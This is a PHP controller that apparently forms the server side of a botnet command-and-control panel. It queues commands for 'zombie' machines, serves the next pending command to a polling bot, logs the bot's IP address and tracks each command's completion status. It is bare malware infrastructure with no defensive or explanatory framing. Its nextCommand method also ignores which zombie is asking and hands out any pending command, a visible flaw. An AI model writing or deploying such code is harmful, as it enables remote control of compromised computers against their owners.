<?php

class CommandController extends BaseController {

	public function queueCommand($zombie_id)
	{
		$name = Input::get('command');
		$type = Input::get('type');

		$command = new Command;
		$command->command = $name;
		$command->type = $type;
		$command->status = 0;
		$command->zombie_id = $zombie_id;
		$command->save();

		return $command->id;
	}

	public function viewCommands($zombie_id)
	{
		$zombie = Zombie::find($zombie_id);

		$commands = $zombie->commands;

		return $commands;
	}

	public function nextCommand($zombie_id)
	{
		$zombie = Zombie::find($zombie_id);

		$ip = Input::get('ip');
		$zombie->ip = $ip;
		$zombie->save();

		$command = Command::where('status', '=', 0)->first();
		if (is_null($command)) {
			return 'No Commands';
		}
		$command->status = 1;
		$command->save();

		return $command;
	}

	public function finishedCommand($command_id)
	{
		$command = Command::find($command_id);
		$command->status = 2;
		$command->save();

		return $command->id;
	}

}
